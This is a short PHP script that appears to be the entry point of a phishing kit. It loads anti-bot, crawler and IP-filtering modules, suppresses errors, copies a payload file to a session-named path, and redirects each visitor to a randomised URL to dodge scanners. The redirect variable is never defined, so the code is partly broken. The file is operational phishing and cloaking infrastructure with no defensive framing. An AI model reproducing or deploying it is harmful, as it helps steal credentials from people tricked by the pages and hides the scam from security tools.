<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
$redc=file_get_contents('infile.php');
$redname=$_SESSION['indexfile'];
if(!file_exists($redname.".php")){
$red = fopen($redname.".php","w");
fwrite($red,$redc);
fclose($red);};
echo '<!DOCTYPE html>
<html>
<head>
<script>setTimeout(function(){window.location.href="'.$d.'/'.$index.'?'.$ran.'='.md5(uniqid().$ran).'";});</script>
</head></html>';
?>